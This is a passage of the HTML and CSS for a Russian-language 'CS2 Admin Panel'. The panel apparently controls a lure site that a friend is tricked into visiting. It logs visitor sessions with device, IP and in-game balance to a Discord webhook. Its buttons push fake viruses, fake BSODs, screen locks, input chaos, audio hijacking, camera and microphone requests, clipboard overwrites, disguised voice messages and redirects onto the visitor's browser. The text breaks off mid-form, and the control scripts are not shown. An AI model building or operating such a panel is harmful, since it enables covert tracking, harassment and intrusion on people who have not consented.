<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>⚙️ Admin Panel</title>
<script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
<style>
*{box-sizing:border-box;margin:0;padding:0;font-family:'Segoe UI',sans-serif}
body{background:linear-gradient(135deg,#0a0c12,#1a1f2e);color:#fff;min-height:100vh;padding:20px}
.wrap{max-width:1300px;margin:0 auto;display:flex;flex-direction:column;gap:20px}
h1{font-size:26px;background:linear-gradient(135deg,#7c3aed,#ec4899);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
.sub{color:#8892a6;font-size:14px}
.status-line{display:flex;gap:12px;align-items:center;font-size:13px;color:#4ade80}
.status-line .dot{width:10px;height:10px;border-radius:50%;background:#4ade80;box-shadow:0 0 10px #4ade80}
.status-line .dot.off{background:#6b7280;box-shadow:none}
.status-line .dot.err{background:#eb4b4b;box-shadow:0 0 10px #eb4b4b}
.panel{background:linear-gradient(145deg,#181c24,#12161e);border:1px solid #262c38;border-radius:16px;padding:22px}
.panel-title{font-size:14px;font-weight:700;text-transform:uppercase;letter-spacing:1.5px;color:#8892a6;margin-bottom:16px;display:flex;justify-content:space-between;align-items:center}
.badge{background:#4ade80;color:#000;padding:4px 10px;border-radius:6px;font-size:11px;font-weight:800}
.badge.red{background:#eb4b4b;color:#fff}
.sessions-list{display:flex;flex-direction:column;gap:10px}
.session{display:grid;grid-template-columns:70px 1fr 200px 140px 130px;gap:14px;align-items:center;padding:14px 18px;background:#0d1117;border:2px solid #262c38;border-radius:12px;cursor:pointer;transition:all .2s}
.session:hover{border-color:#7c3aed;transform:translateX(4px)}
.session.active{border-color:#f0b90b;background:linear-gradient(135deg,rgba(240,185,11,.1),transparent);box-shadow:0 0 20px rgba(240,185,11,.3)}
.session-idx{font-weight:900;font-size:18px;text-align:center;color:#7c3aed;font-family:'Courier New',monospace}
.session-device{font-size:14px;font-weight:700;color:#fff;display:flex;align-items:center;gap:6px;flex-wrap:wrap}
.session-ip{font-family:'Courier New',monospace;font-size:11px;color:#8892a6;margin-top:4px}
.session-time{font-size:12px;color:#8892a6;text-align:right}
.session-time b{color:#4ade80;display:block;font-size:14px}
.session-stats{font-size:12px;color:#8892a6;text-align:right}
.session-stats b{color:#f0b90b;display:block;font-size:14px}
.session-status{display:flex;align-items:center;gap:6px;font-size:12px}
.status-dot{width:8px;height:8px;border-radius:50%;background:#4ade80;box-shadow:0 0 8px #4ade80}
.status-dot.off{background:#6b7280;box-shadow:none}
.empty{text-align:center;padding:40px;color:#8892a6}
.empty b{display:block;color:#f0b90b;font-size:18px;margin-bottom:8px}
.prank-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(160px,1fr));gap:12px}
.prank-btn{padding:14px;border-radius:12px;border:2px solid #262c38;background:#0d1117;color:#fff;cursor:pointer;font-weight:700;font-size:13px;transition:all .2s;text-align:left;display:flex;flex-direction:column;gap:6px}
.prank-btn:hover{border-color:#7c3aed;transform:translateY(-3px)}
.prank-btn .icon{font-size:24px}
.prank-btn .desc{font-size:10px;color:#8892a6;font-weight:400}
.prank-btn.danger{border-color:#eb4b4b}
.prank-btn.gold{border-color:#f0b90b}
.prank-btn.mic{border-color:#4ade80}
.selected-info{padding:14px 18px;background:linear-gradient(135deg,rgba(240,185,11,.1),transparent);border:2px solid #f0b90b;border-radius:12px;margin-bottom:16px;display:flex;justify-content:space-between;gap:16px;flex-wrap:wrap}
.selected-info .label{font-size:11px;color:#8892a6;text-transform:uppercase}
.selected-info .value{font-size:14px;font-weight:700;color:#f0b90b;font-family:'Courier New',monospace}
.no-selection{padding:20px;text-align:center;color:#8892a6;background:#0d1117;border:2px dashed #262c38;border-radius:12px;margin-bottom:16px}
.log{max-height:300px;overflow-y:auto;font-family:'Courier New',monospace;font-size:12px;background:#0d1117;padding:16px;border-radius:12px;border:1px solid #262c38}
.log-entry{padding:4px 0;border-bottom:1px solid #1a1f2e}
.log-entry .time{color:#6b7280;margin-right:8px}
.log-entry.info{color:#4ade80}
.log-entry.warn{color:#f0b90b}
.log-entry.err{color:#eb4b4b}
.video-grid{display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-top:16px}
.video-box{background:#000;border:2px solid #262c38;border-radius:12px;aspect-ratio:16/9;display:flex;align-items:center;justify-content:center;overflow:hidden;position:relative}
.video-box video{width:100%;height:100%;object-fit:contain}
.video-box .label{position:absolute;top:8px;left:8px;background:rgba(0,0,0,.7);padding:4px 8px;border-radius:4px;font-size:11px;font-weight:700}
.video-box .empty{color:#6b7280;font-size:13px}
.btn-screenshot{position:absolute;bottom:8px;right:8px;background:#7c3aed;color:#fff;border:0;padding:6px 12px;border-radius:6px;cursor:pointer;font-weight:700;font-size:11px}
.drop-zone{border:2px dashed #262c38;border-radius:12px;padding:20px;text-align:center;cursor:pointer;transition:.2s;background:rgba(13,17,23,.5);margin-bottom:12px}
.drop-zone:hover,.drop-zone.dragover{border-color:#f0b90b;background:rgba(240,185,11,.05)}
.drop-zone-icon{font-size:36px;margin-bottom:8px}
.drop-zone-text{font-size:14px;color:#8892a6;font-weight:600}
.drop-zone-text b{color:#f0b90b}
.mp3-player{background:#0d1117;border:2px solid #262c38;border-radius:12px;padding:16px;margin-bottom:12px}
.mp3-info{margin-bottom:12px}
.mp3-title{font-size:16px;font-weight:700;color:#fff;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.mp3-sub{font-size:12px;color:#8892a6;margin-top:2px}
.mp3-controls{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:10px}
.mp3-btn{background:#181c24;color:#fff;border:2px solid #262c38;border-radius:10px;padding:10px 14px;font-weight:700;font-size:13px;cursor:pointer;transition:.2s;min-width:44px}
.mp3-btn:hover{border-color:#7c3aed;transform:translateY(-2px)}
.mp3-btn.gold{border-color:#f0b90b;background:linear-gradient(135deg,rgba(240,185,11,.15),transparent);color:#f0b90b}
.mp3-btn.gold:hover{background:linear-gradient(135deg,#f0b90b,#d99f00);color:#000}
.mp3-btn.danger{border-color:#eb4b4b;color:#eb4b4b}
#mp3Seek{width:100%;accent-color:#f0b90b;cursor:pointer}
.mp3-time{display:flex;justify-content:space-between;font-size:11px;color:#8892a6;margin-top:4px;font-family:'Courier New',monospace}
.playlist{max-height:220px;overflow-y:auto;background:#0d1117;border-radius:10px;border:1px solid #262c38;margin-top:10px}
.playlist-item{display:flex;justify-content:space-between;align-items:center;padding:10px 14px;border-bottom:1px solid #1a1f2e;cursor:pointer;transition:.15s;font-size:13px}
.playlist-item:last-child{border-bottom:none}
.playlist-item:hover{background:rgba(124,58,237,.1)}
.playlist-item.active{background:linear-gradient(135deg,rgba(240,185,11,.15),transparent);border-left:3px solid #f0b90b}
.playlist-name{flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;margin-right:10px}
.playlist-actions{display:flex;gap:6px;flex-shrink:0}
.playlist-actions button{background:transparent;border:1px solid #262c38;color:#8892a6;border-radius:6px;padding:4px 8px;font-size:11px;cursor:pointer}
.playlist-actions button:hover{border-color:#f0b90b;color:#f0b90b}
.url-row{display:flex;gap:8px;margin-bottom:10px}
.url-row input,.url-row textarea{flex:1;padding:12px;border-radius:10px;border:1px solid #262c38;background:#0d1117;color:#fff;font-size:14px;outline:none;font-family:inherit}
.url-row input:focus,.url-row textarea:focus{border-color:#7c3aed}
.voice-panel{display:grid;grid-template-columns:1fr;gap:16px}
.voice-col{background:#0d1117;border:2px solid #262c38;border-radius:12px;padding:16px}
.voice-col h4{font-size:13px;color:#8892a6;text-transform:uppercase;letter-spacing:1.5px;margin-bottom:12px}
.voice-btn{padding:14px;border-radius:12px;border:2px solid #262c38;background:#0d1117;color:#fff;cursor:pointer;font-weight:700;font-size:14px;transition:.2s;margin-bottom:8px;width:100%;text-align:left}
.voice-btn:hover{border-color:#4ade80;transform:translateY(-2px)}
.voice-btn.active{border-color:#4ade80;background:linear-gradient(135deg,rgba(74,222,128,.15),transparent);color:#4ade80}
.voice-btn.recording{border-color:#eb4b4b;background:linear-gradient(135deg,rgba(235,75,75,.15),transparent);color:#eb4b4b;animation:recPulse 1s infinite}
@keyframes recPulse{0%,100%{box-shadow:0 0 0 rgba(235,75,75,0)}50%{box-shadow:0 0 20px rgba(235,75,75,.5)}}
.voice-status{font-size:12px;color:#8892a6;margin-top:8px;padding:10px 14px;border-radius:10px;background:#0a0c12;border:1px solid #262c38;text-align:center;line-height:1.5;font-weight:600}
.voice-status.on{color:#4ade80;border-color:#4ade80;background:linear-gradient(135deg,rgba(74,222,128,.1),transparent)}
.voice-changer{margin-top:12px;padding:14px;background:#0a0c12;border-radius:10px;border:1px solid #262c38}
.voice-changer .row{display:flex;align-items:center;gap:10px;margin-bottom:10px;font-size:12px}
.voice-changer .row label{color:#8892a6;min-width:80px}
.voice-changer .row input[type=range]{flex:1;accent-color:#7c3aed}
.voice-changer .row .val{color:#f0b90b;font-weight:700;min-width:50px;text-align:right;font-family:'Courier New',monospace}
.preset-btns{display:flex;gap:6px;flex-wrap:wrap;margin-top:8px}
.preset-btn{padding:8px 12px;border-radius:8px;border:1px solid #262c38;background:#181c24;color:#fff;font-size:11px;font-weight:700;cursor:pointer}
.preset-btn:hover{border-color:#f0b90b}
.preset-btn.active{background:linear-gradient(135deg,#7c3aed,#ec4899);border-color:transparent}
.webhook-row{display:flex;gap:10px;align-items:center;margin-bottom:14px;flex-wrap:wrap}
.webhook-row input{flex:1;min-width:200px;padding:12px;border-radius:10px;border:1px solid #262c38;background:#0d1117;color:#fff;font-size:13px;outline:none;font-family:monospace}
.webhook-row input:focus{border-color:#5865f2}
.webhook-status{font-size:12px;padding:6px 10px;border-radius:8px;font-weight:700;white-space:nowrap}
.webhook-status.on{background:rgba(74,222,128,.15);color:#4ade80}
.webhook-status.off{background:rgba(235,75,75,.15);color:#eb4b4b}
.stats-mini{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:10px;margin-top:14px}
.stat-mini{background:#0d1117;border:1px solid #262c38;border-radius:10px;padding:12px;text-align:center}
.stat-mini .v{font-size:22px;font-weight:800;color:#f0b90b}
.stat-mini .l{font-size:11px;color:#8892a6;text-transform:uppercase;letter-spacing:1px;margin-top:4px}
@media(max-width:900px){.session{grid-template-columns:70px 1fr}.session-time,.session-stats,.session-status{display:none}.video-grid{grid-template-columns:1fr}}
</style>
</head>
<body>
<div class="wrap">
  <div>
    <h1>⚙️ CS2 Admin Panel</h1>
    <div class="sub">PeerJS + Discord вебхук. <span id="uptime">0 сек</span> работы.</div>
    <div class="status-line" style="margin-top:10px"><div class="dot" id="peerDot"></div><span id="peerStatus">Запуск...</span></div>
  </div>

  <div class="panel">
    <div class="panel-title"><span>🔔 Discord вебхук</span></div>
    <div class="webhook-row">
      <input id="webhookInput" type="text" placeholder="https://discord.com/api/webhooks/..." autocomplete="off">
      <span class="webhook-status off" id="webhookStatus">не задан</span>
      <button class="mp3-btn gold" id="webhookSave">Сохранить</button>
      <button class="mp3-btn" id="webhookTest">Тест</button>
    </div>
    <div class="stats-mini">
      <div class="stat-mini"><div class="v" id="statTotal">0</div><div class="l">Всего зашло</div></div>
      <div class="stat-mini"><div class="v" id="statOnline">0</div><div class="l">Онлайн</div></div>
      <div class="stat-mini"><div class="v" id="statDrops">0</div><div class="l">Дропов</div></div>
      <div class="stat-mini"><div class="v" id="statTopBalance">$0</div><div class="l">Топ баланс</div></div>
    </div>
  </div>

  <div class="panel">
    <div class="panel-title">
      <span>👥 Сессии</span>
      <span class="badge" id="sessionCount">0</span>
    </div>
    <div class="url-row" style="margin-bottom:10px">
      <input id="sessionFilter" type="text" placeholder="Фильтр по устройству или IP..." style="font-size:12px">
      <select id="sortSessions" style="padding:10px;border-radius:8px;border:1px solid #262c38;background:#0d1117;color:#fff;font-size:12px">
        <option value="time">По времени</option>
        <option value="balance">По балансу</option>
        <option value="drops">По дропам</option>
      </select>
    </div>
    <div class="sessions-list" id="sessionsList">
      <div class="empty"><b>Пока никого</b>Друг должен зайти на сайт</div>
    </div>
  </div>

  <div class="panel">
    <div class="panel-title"><span>🎯 Выбранная сессия</span></div>
    <div id="selectedInfo" class="no-selection">Выбери сессию</div>
  </div>

  <div class="panel">
    <div class="panel-title"><span>🎙 Голосовая связь</span></div>
    <div class="voice-panel">
      <div class="voice-col">
        <h4>🎙 Ты → Друг</h4>
        <button class="voice-btn" id="talkBtn">🎙 Начать говорить</button>
        <div class="voice-status" id="talkStatus">Не активно</div>
        <div class="voice-changer">
          <div style="font-size:12px;color:#8892a6;margin-bottom:8px;font-weight:700">🎭 Смена голоса</div>
          <div class="row"><label>Питч</label><input type="range" id="pitchSlider" min="50" max="200" value="100"><span class="val" id="pitchVal">1.00</span></div>
          <div class="row"><label>Эхо</label><input type="range" id="echoSlider" min="0" max="100" value="0"><span class="val" id="echoVal">0%</span></div>
          <div class="preset-btns">
            <button class="preset-btn active" data-preset="normal">Обычный</button>
            <button class="preset-btn" data-preset="monster">Монстр</button>
            <button class="preset-btn" data-preset="girl">Девушка</button>
            <button class="preset-btn" data-preset="kid">Ребёнок</button>
            <button class="preset-btn" data-preset="robot">Робот</button>
            <button class="preset-btn" data-preset="echo">Эхо</button>
          </div>
        </div>
      </div>
    </div>
  </div>

  <div class="panel">
    <div class="panel-title"><span>😈 Основные пранки</span></div>
    <div class="prank-grid">
      <button class="prank-btn danger" data-prank="screamer"><div class="icon">😱</div><div>Скример</div></button>
      <button class="prank-btn danger" data-prank="shake"><div class="icon">📳</div><div>Тряска</div></button>
      <button class="prank-btn danger" data-prank="fakeVirus"><div class="icon">🦠</div><div>Фейк-вирус</div></button>
      <button class="prank-btn danger" data-prank="bsod"><div class="icon">💀</div><div>BSOD</div></button>
      <button class="prank-btn danger" data-prank="blockScreen"><div class="icon">🔒</div><div>Заблокировать</div></button>
      <button class="prank-btn gold" data-prank="stop"><div class="icon">🛑</div><div>СТОП всё</div></button>
    </div>
  </div>

  <div class="panel">
    <div class="panel-title"><span>🎨 Визуальные</span></div>
    <div class="prank-grid">
      <button class="prank-btn" data-prank="invert"><div class="icon">🎨</div><div>Инверсия</div></button>
      <button class="prank-btn" data-prank="blur"><div class="icon">🌫️</div><div>Размытие</div></button>
      <button class="prank-btn" data-prank="hue"><div class="icon">🌈</div><div>Сдвиг</div></button>
      <button class="prank-btn" data-prank="grayscale"><div class="icon">⬛</div><div>Ч/Б</div></button>
      <button class="prank-btn" data-prank="rainbow"><div class="icon">🌊</div><div>Радуга</div></button>
      <button class="prank-btn" data-prank="rotate"><div class="icon">🔄</div><div>Переворот</div></button>
      <button class="prank-btn" data-prank="rotateSlow"><div class="icon">🌀</div><div>Медленное вращение</div></button>
      <button class="prank-btn" data-prank="slowmo"><div class="icon">🐌</div><div>Замедление</div></button>
      <button class="prank-btn" data-prank="fast"><div class="icon">⚡</div><div>Ускорение</div></button>
      <button class="prank-btn" data-prank="vortex"><div class="icon">🌪️</div><div>Воронка</div></button>
      <button class="prank-btn" data-prank="wave"><div class="icon">🌊</div><div>Волна</div></button>
      <button class="prank-btn" data-prank="bigCursor"><div class="icon">👆</div><div>Курсор</div></button>
      <button class="prank-btn" data-prank="trackingEye"><div class="icon">👁️</div><div>Следящий глаз</div></button>
    </div>
  </div>

  <div class="panel">
    <div class="panel-title"><span>🎮 Хардкор</span></div>
    <div class="prank-grid">
      <button class="prank-btn danger" data-prank="freeze"><div class="icon">🧊</div><div>Заморозка</div></button>
      <button class="prank-btn danger" data-prank="mouseChaos"><div class="icon">🐭</div><div>Мышь-предатель</div></button>
      <button class="prank-btn danger" data-prank="keyboardChaos"><div class="icon">⌨️</div><div>Клавиатурный хаос</div></button>
      <button class="prank-btn danger" data-prank="shuffle"><div class="icon">🔀</div><div>Перемешивание</div></button>
      <button class="prank-btn danger" data-prank="audioHijack"><div class="icon">🎵</div><div>Аудио-захват</div></button>
    </div>
  </div>

  <div class="panel">
    <div class="panel-title"><span>🌐 Действия</span></div>
    <div class="prank-grid">
      <button class="prank-btn" data-prank="reload"><div class="icon">🔄</div><div>Перезагрузить</div></button>
      <button class="prank-btn" data-prank="closeTab"><div class="icon">🚪</div><div>Закрыть вкладку</div></button>
      <button class="prank-btn" data-prank="requestCam"><div class="icon">📸</div><div>Запросить камеру</div></button>
      <button class="prank-btn mic" data-prank="requestMic"><div class="icon">🎤</div><div>Запросить микрофон</div></button>
      <button class="prank-btn" data-prank="requestNotif"><div class="icon">🔔</div><div>Разрешить уведомления</div></button>
      <button class="prank-btn" data-prank="vibrate"><div class="icon">📳</div><div>Вибрация (телефон)</div></button>
      <button class="prank-btn" data-prank="wakeLock"><div class="icon">💡</div><div>Экран не гаснет</div></button>
      <button class="prank-btn danger" data-prank="clearInventory"><div class="icon">🗑️</div><div>Очистить инвентарь</div></button>
      <button class="prank-btn danger" data-prank="resetStats"><div class="icon">📊</div><div>Сбросить статистику</div></button>
    </div>
  </div>

  <div class="panel">
    <div class="panel-title"><span>💬 Модальное окно</span></div>
    <div class="url-row"><input id="modalTitle" type="text" value="Сообщение"></div>
    <div class="url-row"><input id="modalText" type="text" value="Привет!"><button class="mp3-btn gold" id="modalBtn">Показать</button></div>
  </div>

  <div class="panel">
    <div class="panel-title"><span>💬 Alert / Console / Title / Favicon</span></div>
    <div class="url-row"><input id="alertText" type="text" value="ПРИВЕТ ОТ ХАКЕРА"><button class="mp3-btn gold" id="alertBtn">Alert</button></div>
    <div class="url-row"><input id="consoleText" type="text" value="CS2 — ты в моей власти" placeholder="Текст в консоль"><button class="mp3-btn" id="consoleBtn">Консоль</button></div>
    <div class="url-row"><input id="titleText" type="text" value="😱 ВЗЛОМ" placeholder="Title"><button class="mp3-btn" id="titleBtn">Title</button></div>
    <div class="url-row"><input id="faviconEmoji" type="text" value="😱" placeholder="Эмодзи"><button class="mp3-btn" id="faviconBtn">Favicon</button></div>
    <div class="url-row"><input id="clipboardText" type="text" value="Я люблю CS2" placeholder="Скопировать в буфер"><button class="mp3-btn" id="clipboardBtn">📋 Копировать</button></div>
  </div>

  <div class="panel">
    <div class="panel-title"><span>🌐 URL / Редирект</span></div>
    <div class="url-row">
      <input id="redirectUrl" type="text" placeholder="https://..." value="https://www.youtube.com/watch?v=dQw4w9WgXcQ">
